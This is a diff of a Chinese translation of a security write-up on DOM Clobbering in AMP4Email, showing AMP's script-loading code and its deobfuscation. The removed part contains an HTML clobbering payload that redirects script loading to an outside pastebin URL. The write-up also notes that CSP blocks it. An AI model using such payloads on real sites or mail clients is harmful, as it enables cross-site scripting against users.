-                <span style="color:#a6e22e">yb</span>(<span style="color:#a6e22e">a</span>, <span style="color:#e6db74">&#34;_&#34;</span>) <span style="color:#f92672">?</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">dn</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#a6e22e">a</span>) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;custom-template&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;custom-element&#34;</span>, <span style="color:#a6e22e">a</span>);
-                <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;data-script&#34;</span>, <span style="color:#a6e22e">a</span>);
-                <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;i-amphtml-inserted&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>);
-                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">location</span>;
-                <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">test</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">testLocation</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">testLocation</span>);
-                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">localDev</span>) {
-                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;//&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">host</span>;
-                    <span style="color:#e6db74">&#34;about:&#34;</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>);
-                    <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/dist&#34;</span>
-                } <span style="color:#66d9ef">else</span>
-                    <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hd</span>.<span style="color:#a6e22e">cdn</span>;
-                <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">rtvVersion</span>;
-                <span style="color:#66d9ef">null</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0.1&#34;</span>);
-                <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
-                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
-                <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/rtv/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;v0/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.js&#34;</span>;
-                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">b</span>);
-                <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>
-            }
-            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gn</span>(<span style="color:#a6e22e">c</span>)
-        }
-</code></pre></div>
-<p>尽管阅读起来不是特别困难，但下面是手动去混淆的代码（为了更清晰，省略了某些部分）：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> window.document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);
-<span style="color:#a6e22e">script</span>.<span style="color:#66d9ef">async</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
- 
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loc</span>;
-<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">test</span> <span style="color:#f92672">&amp;&amp;</span> window.<span style="color:#a6e22e">testLocation</span>) {
-    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">testLocation</span>
-} <span style="color:#66d9ef">else</span> {
-    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>;
-}
- 
-<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">localDev</span>) {
-    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loc</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;//&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">loc</span>.<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/dist&#34;</span>
-} <span style="color:#66d9ef">else</span> {
-    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://cdn.ampproject.org&#34;</span>;
-}
- 
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">singlePass</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
-<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loc</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/rtv/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">rtvVersion</span>; <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">singlePass</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;v0/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">pluginName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.js&#34;</span>;
- 
-document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">b</span>);
-</code></pre></div>
-<p>因此，在第1行中，代码创建了一个新的 <code>script</code> 元素。然后，检查 <code>AMP_MODE.test</code> 和 <code>window.testLocation</code> 是否存在。如果是这样，并且 AMP_MODE.localDev 为真（第11行），则将<code>window.testLocation</code> 作为生成脚本URL的基础。然后，在第17和18行中，将其他一些属性连接起来以形成完整的URL。虽然乍一看可能并不明显，但是由于代码的编写方式以及 DOM Clobbering，我们实际上可以控制完整的URL。让我们假设 <code>AMP_MODE.localDev</code> 和 <code>AMP_MODE.test</code> 为真，代码会进一步简化：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> window.document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);
-<span style="color:#a6e22e">script</span>.<span style="color:#66d9ef">async</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
- 
-<span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">testLocation</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;//&#34;</span> <span style="color:#f92672">+</span> 
-        window.<span style="color:#a6e22e">testLocation</span>.<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/dist/rtv/&#34;</span> <span style="color:#f92672">+</span> 
-        <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">rtvVersion</span>; <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> 
-        (<span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">+</span> 
-        <span style="color:#e6db74">&#34;v0/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">pluginName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.js&#34;</span>;
- 
-document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">b</span>);
-<span style="color:#e6db74">````</span>
-
-<span style="color:#a6e22e">你还记得我们之前通过</span> <span style="color:#a6e22e">DOM</span> <span style="color:#a6e22e">Clobbering</span> <span style="color:#a6e22e">重载</span> <span style="color:#e6db74">`window.test1.test2`</span> <span style="color:#a6e22e">的练习吗</span><span style="color:#960050;background-color:#1e0010">？</span><span style="color:#a6e22e">现在我们需要做同样的事情</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#a6e22e">只要重载</span> <span style="color:#e6db74">`window.testLocation.protocol`</span><span style="color:#960050;background-color:#1e0010">。</span><span style="color:#a6e22e">因此</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#a6e22e">最终的有效载荷</span><span style="color:#960050;background-color:#1e0010">：</span>
-
-<span style="color:#e6db74">```html
-</span><span style="color:#e6db74">&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;
-</span><span style="color:#e6db74">&lt;a id=&#34;AMP_MODE&#34;&gt;&lt;/a&gt;
-</span><span style="color:#e6db74">&lt;a id=&#34;AMP_MODE&#34; name=&#34;localDev&#34;&gt;&lt;/a&gt;
-</span><span style="color:#e6db74">&lt;a id=&#34;AMP_MODE&#34; name=&#34;test&#34;&gt;&lt;/a&gt;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">&lt;!-- window.testLocation.protocol is a base for the URL --&gt;
-</span><span style="color:#e6db74">&lt;a id=&#34;testLocation&#34;&gt;&lt;/a&gt;
-</span><span style="color:#e6db74">&lt;a id=&#34;testLocation&#34; name=&#34;protocol&#34; 
-</span><span style="color:#e6db74">   href=&#34;https://pastebin.com/raw/0tn8z0rG#&#34;&gt;&lt;/a&gt;
-</span><span style="color:#e6db74"></span></code></pre></div>
-<p>实际上，由于在 AMP 中部署了 Content-Security-Policy，因此代码在实际情况下无法执行：</p>
-
-<pre><code>Content-Security-Policy: default-src 'none'; 
-script-src 'sha512-oQwIl...==' 
+<p>如图8 所示，AMP4Email 尝试加载某些JS文件，但由于 404 而未能加载。但是，特别引人注目的是，URL （https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.js）中存在 <code>undefined</code>。我能够想出的唯一一个合理的解释：AMP 尝试获取 <code>AMP_MODE</code> 的属性以将其放入URL。由于 DOM Clobbering，缺少了预期的属性，因此是 <code>undefined</code>。包含代码的代码如下所示：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">preloadExtension</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;amp-embed&#34;</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amp-ad&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fn</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">a</span>, <span style="color:#f92672">!</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">loaded</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">error</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">void</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;[custom-element=&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;]&#39;</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!!</span><span style="color:#a6e22e">d</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">d</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">b</span>.<span style="color:#66d9ef">async</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">yb</span>(<span style="color:#a6e22e">a</span>, <span style="color:#e6db74">&#34;_&#34;</span>) <span style="color:#f92672">?</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">dn</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#a6e22e">a</span>) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;custom-template&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;custom-element&#34;</span>, <span style="color:#a6e22e">a</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;data-script&#34;</span>, <span style="color:#a6e22e">a</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;i-amphtml-inserted&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">location</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">test</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">testLocation</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.<span style="color:#a6e22e">testLocation</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">localDev</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;//&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">host</span>;
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;about:&#34;</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/dist&#34;</span>
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hd</span>.<span style="color:#a6e22e">cdn</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">rtvVersion</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">null</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0.1&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;-&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">t</span>().<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/rtv/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;v0/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">a</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.js&#34;</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">win</span>.document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">b</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">scriptPresent</span> <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gn</span>(<span style="color:#a6e22e">c</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>尽管阅读起来不是特别困难，但下面是手动去混淆的代码（为了更清晰，省略了某些部分）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> window.document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">script</span>.<span style="color:#66d9ef">async</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">loc</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">test</span> <span style="color:#f92672">&amp;&amp;</span> window.<span style="color:#a6e22e">testLocation</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">testLocation</span>
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">localDev</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loc</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;//&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">loc</span>.<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/dist&#34;</span>
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">loc</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://cdn.ampproject.org&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">singlePass</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">loc</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/rtv/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">rtvVersion</span>; <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">singlePass</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;v0/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">pluginName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.js&#34;</span>;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">b</span>);
+</span></span></code></pre></div><p>因此，在第1行中，代码创建了一个新的 <code>script</code> 元素。然后，检查 <code>AMP_MODE.test</code> 和 <code>window.testLocation</code> 是否存在。如果是这样，并且 AMP_MODE.localDev 为真（第11行），则将<code>window.testLocation</code> 作为生成脚本URL的基础。然后，在第17和18行中，将其他一些属性连接起来以形成完整的URL。虽然乍一看可能并不明显，但是由于代码的编写方式以及 DOM Clobbering，我们实际上可以控制完整的URL。让我们假设 <code>AMP_MODE.localDev</code> 和 <code>AMP_MODE.test</code> 为真，代码会进一步简化：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">script</span> <span style="color:#f92672">=</span> window.document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">script</span>.<span style="color:#66d9ef">async</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">testLocation</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;//&#34;</span> <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        window.<span style="color:#a6e22e">testLocation</span>.<span style="color:#a6e22e">host</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/dist/rtv/&#34;</span> <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">rtvVersion</span>; <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        (<span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">AMP_MODE</span>.<span style="color:#a6e22e">singlePassType</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;v0/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">pluginName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.js&#34;</span>;
+</span></span><span style="display:flex;"><span> 
